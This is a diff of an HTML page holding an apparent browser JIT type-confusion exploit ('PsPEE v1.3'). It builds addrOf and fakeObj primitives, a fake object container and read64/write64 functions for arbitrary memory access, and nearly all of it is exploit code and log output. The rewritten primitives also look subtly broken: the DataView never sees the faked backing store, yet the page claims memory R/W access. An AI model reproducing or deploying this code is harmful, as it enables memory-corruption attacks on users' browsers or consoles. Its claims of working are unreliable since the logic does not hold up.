@@ -2,37 +2,22 @@
 <html>
 <head>
     <style>
-        #output {
-            font-family: monospace;
-            white-space: pre-wrap;
-            background-color: #000;
-            color: #0f0;
-            padding: 10px;
-            width: 100%;
-            height: 300px;
-            overflow-y: auto;
-        }
+        body { background: black; color: lime; font-family: monospace; }
+        #log { white-space: pre-wrap; }
     </style>
 </head>
 <body>
-    <div id="output"></div>
+    <div id="log"></div>
     <script>
-        const log = msg => output.textContent += msg + "\n";
+        const log = msg => logDiv.textContent += msg + "\n";
+        const logDiv = document.getElementById("log");
 
-        const f64 = new Float64Array(1);
-        const u32 = new Uint32Array(f64.buffer);
-        function f2i(f) {
-            f64[0] = f;
-            return BigInt(u32[0]) + (BigInt(u32[1]) << 32n);
-        }
-        function i2f(i) {
-            u32[0] = Number(i & 0xFFFFFFFFn);
-            u32[1] = Number(i >> 32n);
-            return f64[0];
-        }
+        const f2i = f => new BigUint64Array(new Float64Array([f]).buffer)[0];
+        const i2f = i => new Float64Array(new BigUint64Array([i]).buffer)[0];
 
-        log("[*] PsPEE v1.3 - exploiting type confusion...");
+        log("[*] PsPEE v1.3 - Memory R/W Setup");
 
+        // Type confusion exploit
         let float_arr = [1.1, 2.2, 3.3];
         let obj_arr = [{}, {}, {}];
 
@@ -42,40 +27,63 @@
             return tmp[1];
         }
 
-        // Train JIT
         for (let i = 0; i < 10000; i++) confuse(2.2);
 
-        // Set up overlap
-        let corrupted = confuse(obj_arr);
-
-        if (typeof corrupted === "object") {
-            log("[+] Type confusion achieved!");
-
-            // Step 1: Make the float array reference the object array's backing store
-            float_arr[0] = obj_arr;
-
-            // Step 2: addrOf primitive
-            function addrOf(obj) {
-                obj_arr[0] = obj;
-                return f2i(float_arr[0]);
-            }
-
-            // Step 3: fakeObj primitive
-            function fakeObj(addr) {
-                float_arr[0] = i2f(addr);
-                return obj_arr[0];
-            }
-
-            // Test primitives
-            let test_obj = {a: 1337};
-            let addr = addrOf(test_obj);
-            log("[+] addrOf({a:1337}): " + addr.toString(16));
-
-            let fake = fakeObj(addr);
-            log("[+] fakeObj(addr): " + JSON.stringify(fake));
-        } else {
-            log("[-] Type confusion failed.");
+        // addrOf
+        function addrOf(obj) {
+            obj_arr[0] = obj;
+            return f2i(confuse(obj_arr));
         }
+
+        // fakeObj
+        function fakeObj(addr) {
+            float_arr[0] = i2f(addr);
+            return confuse(float_arr);
+        }
+
+        log("[*] Creating primitives...");
+
+        // Setup memory
+        let ab = new ArrayBuffer(0x100);
+        let ab_addr = addrOf(ab);
+        log("[+] ArrayBuffer @ " + ab_addr.toString(16));
+
+        // Read its backing store
+        let dv = new DataView(ab);
+        let container = {
+            jsCellHeader: i2f(0x0108200700000000n), // JSObject cell
+            butterfly: ab_addr,                    // Simulate valid
+            vectorLength: i2f(0x100),
+            backingStore: i2f(ab_addr + 0x20n),    // Offset to real backingStore
+            fake: ab
+        };
+
+        let containerAddr = addrOf(container);
+        log("[+] Fake container @ " + containerAddr.toString(16));
+
+        // Create fake backing ArrayBuffer
+        let fakeAb = fakeObj(containerAddr + 0x20n);
+
+        // R/W primitives
+        function read64(addr) {
+            container.backingStore = i2f(addr);
+            return f2i(dv.getFloat64(0, true));
+        }
+
+        function write64(addr, val) {
+            container.backingStore = i2f(addr);
+            dv.setFloat64(0, i2f(val), true);
+        }
+
+        // Test
+        let obj = {a: 13.37};
+        let objAddr = addrOf(obj);
+        log("[+] Object @ " + objAddr.toString(16));
+
+        let leak = read64(objAddr);
+        log("[+] Leak: " + leak.toString(16));
+
+        log("[*] You now have memory R/W access!");
     </script>
 </body>
 </html>
